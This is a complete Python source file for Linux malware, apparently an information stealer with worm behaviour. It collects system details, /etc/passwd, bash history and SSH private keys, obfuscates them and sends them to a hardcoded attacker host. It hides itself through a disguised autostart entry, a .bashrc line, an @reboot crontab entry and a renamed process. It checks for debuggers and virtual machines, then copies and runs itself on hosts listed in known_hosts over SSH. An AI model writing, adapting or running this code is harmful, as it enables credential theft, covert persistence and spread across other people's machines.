import os
import sys
import socket
import platform
import getpass
import subprocess
import json
import base64
import time
import shutil
import requests
import fcntl
import tempfile
from pathlib import Path
from datetime import datetime

ATTACKER_IP = "192.168.100.10"
ATTACKER_PORT = 8080
EXFIL_ENDPOINT = f"http://{ATTACKER_IP}:{ATTACKER_PORT}/upload"
HEARTBEAT_ENDPOINT = f"http://{ATTACKER_IP}:{ATTACKER_PORT}/heartbeat"
SLEEP_TIME = 30
PERSISTENCE_NAME = "systemd-service"
STEALTH_PROCESS_NAME = "systemd-network"
BACKDOOR_PATH = os.path.expanduser("~/.local/share/.cache/.systemd-helper")

FILES_TO_COLLECT = [
    "/etc/passwd",
    "/etc/hosts",
    os.path.expanduser("~/.ssh/id_rsa"),
    os.path.expanduser("~/.bash_history")
]

EXCLUDE_DIRS = ["/proc", "/sys", "/dev", "/run", "/tmp"]

def prevent_multiple_instances():
    lock_file_path = os.path.join(tempfile.gettempdir(), '.systemd-lock')
    
    try:
        global lock_file
        lock_file = open(lock_file_path, 'w')
        fcntl.flock(lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
        return True
    except IOError:
        return False

def collect_system_info():
    system_data = {}
    
    system_data["timestamp"] = datetime.now().isoformat()
    system_data["hostname"] = socket.gethostname()
    system_data["os"] = platform.system()
    system_data["os_release"] = platform.release()
    system_data["os_version"] = platform.version()
    system_data["architecture"] = platform.machine()
    system_data["processor"] = platform.processor()
    system_data["username"] = getpass.getuser()
    system_data["home_directory"] = os.path.expanduser("~")
    
    try:
        hostname_ip = socket.gethostbyname(socket.gethostname())
        system_data["local_ip"] = hostname_ip
    except:
        system_data["local_ip"] = "Unable to retrieve"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        system_data["external_ip"] = s.getsockname()[0]
        s.close()
    except:
        system_data["external_ip"] = "Unable to retrieve"
    
    try:
        result = subprocess.run(['uname', '-a'], capture_output=True, text=True, timeout=5)
        system_data["kernel_info"] = result.stdout.strip()
    except:
        system_data["kernel_info"] = "Unable to retrieve"
    
    try:
        with open("/proc/cpuinfo", "r") as f:
            cpu_info = f.read()
        for line in cpu_info.split('\n'):
            if "model name" in line:
                system_data["cpu_model"] = line.split(":")[1].strip()
                break
    except:
        system_data["cpu_model"] = "Unable to retrieve"
    
    try:
        result = subprocess.run(['free', '-h'], capture_output=True, text=True, timeout=5)
        system_data["memory_info"] = result.stdout.strip()
    except:
        system_data["memory_info"] = "Unable to retrieve"
    
    try:
        result = subprocess.run(['df', '-h', '/'], capture_output=True, text=True, timeout=5)
        system_data["disk_usage"] = result.stdout.strip()
    except:
        system_data["disk_usage"] = "Unable to retrieve"
    
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
        process_output = result.stdout.strip()[:5000]
        encoded_processes = base64.b64encode(process_output.encode()).decode()
        system_data["running_processes"] = encoded_processes
    except:
        system_data["running_processes"] = "Unable to retrieve"
    
    try:
        result = subprocess.run(['netstat', '-tunap'], capture_output=True, text=True, timeout=5)
        network_output = result.stdout.strip()
        encoded_network = base64.b64encode(network_output.encode()).decode()
        system_data["network_connections"] = encoded_network
    except:
        system_data["network_connections"] = "Unable to retrieve"
    
    try:
        result = subprocess.run(['who'], capture_output=True, text=True, timeout=5)
        system_data["logged_in_users"] = result.stdout.strip()
    except:
        system_data["logged_in_users"] = "No users logged in"
    
    return system_data

def collect_file_data():
    file_data = {}
    
    for file_path in FILES_TO_COLLECT:
        try:
            if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                if os.path.getsize(file_path) < 1048576:
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                        encoded_content = base64.b64encode(content.encode()).decode()
                        file_data[file_path] = {
                            "status": "success",
                            "size": os.path.getsize(file_path),
                            "content": encoded_content
                        }
                else:
                    file_data[file_path] = {"status": "skipped", "reason": "File too large"}
            else:
                file_data[file_path] = {"status": "skipped", "reason": "Not accessible"}
        except Exception as e:
            file_data[file_path] = {"status": "error", "reason": str(e)}
    
    return file_data

def find_ssh_keys():
    ssh_keys = {}
    ssh_dir = os.path.expanduser("~/.ssh/")
    
    if os.path.exists(ssh_dir):
        try:
            for file in os.listdir(ssh_dir):
                file_path = os.path.join(ssh_dir, file)
                if os.path.isfile(file_path) and os.access(file_path, os.R_OK):
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                        encoded_content = base64.b64encode(content.encode()).decode()
                        ssh_keys[file_path] = encoded_content
        except:
            pass
    
    return ssh_keys

def obfuscate_data(data):
    json_data = json.dumps(data)
    encoded = base64.b64encode(json_data.encode()).decode()
    reversed_encoded = encoded[::-1]
    return base64.b64encode(reversed_encoded.encode()).decode()

def exfiltrate_data(data):
    try:
        obfuscated = obfuscate_data(data)
        payload = {"data": obfuscated, "hostname": socket.gethostname()}
        
        response = requests.post(
            EXFIL_ENDPOINT, 
            json=payload, 
            timeout=10,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
        )
        return response.status_code == 200
    except:
        return False

def establish_persistence():
    persistence_methods = []
    
    try:
        script_path = os.path.abspath(sys.argv[0])
        persistence_dir = os.path.dirname(BACKDOOR_PATH)
        os.makedirs(persistence_dir, exist_ok=True)
        
        if not os.path.exists(BACKDOOR_PATH) or os.path.getsize(BACKDOOR_PATH) != os.path.getsize(script_path):
            shutil.copy2(script_path, BACKDOOR_PATH)
            os.chmod(BACKDOOR_PATH, 0o755)
            persistence_methods.append("binary_copied")
    except:
        pass
    
    try:
        autostart_dir = os.path.expanduser("~/.config/autostart/")
        os.makedirs(autostart_dir, exist_ok=True)
        
        desktop_file = os.path.join(autostart_dir, f"{PERSISTENCE_NAME}.desktop")
        
        if not os.path.exists(desktop_file):
            desktop_entry = f"""[Desktop Entry]
Type=Application
Name={PERSISTENCE_NAME}
Exec=/bin/bash -c 'sleep 15 && {BACKDOOR_PATH} &'
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
Terminal=false
StartupNotify=false
"""
            with open(desktop_file, 'w') as f:
                f.write(desktop_entry)
            persistence_methods.append("autostart_created")
    except:
        pass
    
    try:
        bashrc_path = os.path.expanduser("~/.bashrc")
        bashrc_marker = "# System update service"
        
        with open(bashrc_path, 'r') as f:
            bashrc_content = f.read()
        
        if bashrc_marker not in bashrc_content:
            bashrc_entry = f"\n{bashrc_marker}\n(sleep 15 && {BACKDOOR_PATH} &> /dev/null &)\n"
            with open(bashrc_path, 'a') as f:
                f.write(bashrc_entry)
            persistence_methods.append("bashrc_modified")
    except:
        pass
    
    try:
        cron_check = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        if 'systemd-helper' not in cron_check.stdout:
            cron_cmd = f"@reboot sleep 20 && {BACKDOOR_PATH} > /dev/null 2>&1"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
            persistence_methods.append("crontab_created")
    except:
        pass
    
    return persistence_methods

def process_masquerade():
    try:
        import ctypes
        libc = ctypes.CDLL(None)
        libc.prctl(15, STEALTH_PROCESS_NAME.encode(), 0, 0, 0)
    except:
        pass

def anti_debugging_demonstration():
    detection_triggered = False
    
    try:
        if sys.gettrace() is not None:
            detection_triggered = True
    except:
        pass
    
    try:
        with open('/proc/self/status', 'r') as f:
            status = f.read()
            if 'TracerPid:\t0' not in status:
                detection_triggered = True
    except:
        pass
    
    try:
        if 'gdb' in subprocess.run(['ps', 'aux'], capture_output=True, text=True).stdout.lower():
            detection_triggered = True
    except:
        pass
    
    return detection_triggered

def check_vm_environment():
    vm_indicators_found = []
    
    try:
        with open('/proc/cpuinfo', 'r') as f:
            cpuinfo = f.read().lower()
            vm_indicators = ['vmware', 'virtualbox', 'qemu', 'kvm', 'hypervisor']
            for indicator in vm_indicators:
                if indicator in cpuinfo:
                    vm_indicators_found.append(indicator)
    except:
        pass
    
    try:
        result = subprocess.run(['systemd-detect-virt'], capture_output=True, text=True)
        if result.returncode == 0 and 'none' not in result.stdout.lower():
            vm_indicators_found.append(f"systemd-detect-virt: {result.stdout.strip()}")
    except:
        pass
    
    return vm_indicators_found

def self_propagate():
    try:
        ssh_dir = os.path.expanduser("~/.ssh/")
        if os.path.exists(ssh_dir):
            known_hosts = os.path.join(ssh_dir, "known_hosts")
            if os.path.exists(known_hosts):
                with open(known_hosts, 'r') as f:
                    hosts = f.readlines()
                
                for host in hosts[:5]:
                    target_ip = host.split()[0]
                    script_path = os.path.abspath(sys.argv[0])
                    
                    scp_cmd = f"sshpass -p '' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {target_ip} 'cat > /tmp/.update.py' < {script_path}"
                    subprocess.run(scp_cmd, shell=True, timeout=10, capture_output=True)
                    
                    exec_cmd = f"sshpass -p '' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {target_ip} 'python3 /tmp/.update.py &'"
                    subprocess.run(exec_cmd, shell=True, timeout=10, capture_output=True)
    except:
        pass

def heartbeat():
    try:
        requests.get(HEARTBEAT_ENDPOINT, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
    except:
        pass

def main():
    if not prevent_multiple_instances():
        sys.exit(0)
    
    process_masquerade()
    
    debugger_detected = anti_debugging_demonstration()
    vm_indicators = check_vm_environment()
    
    persistence_result = establish_persistence()
    
    while True:
        try:
            system_info = collect_system_info()
            
            system_info["debugger_detected"] = debugger_detected
            system_info["vm_environment_indicators"] = vm_indicators
            system_info["execution_environment"] = "VM" if vm_indicators else "Physical Machine"
            system_info["persistence_methods"] = persistence_result
            
            file_info = collect_file_data()
            ssh_keys = find_ssh_keys()
            
            combined_data = {
                "system_info": system_info,
                "file_data": file_info,
                "ssh_keys": ssh_keys,
                "exfiltration_type": "full_collection"
            }
            
            exfiltrate_data(combined_data)
            
            self_propagate()
            heartbeat()
            
            time.sleep(SLEEP_TIME)
        except Exception as e:
            time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    main()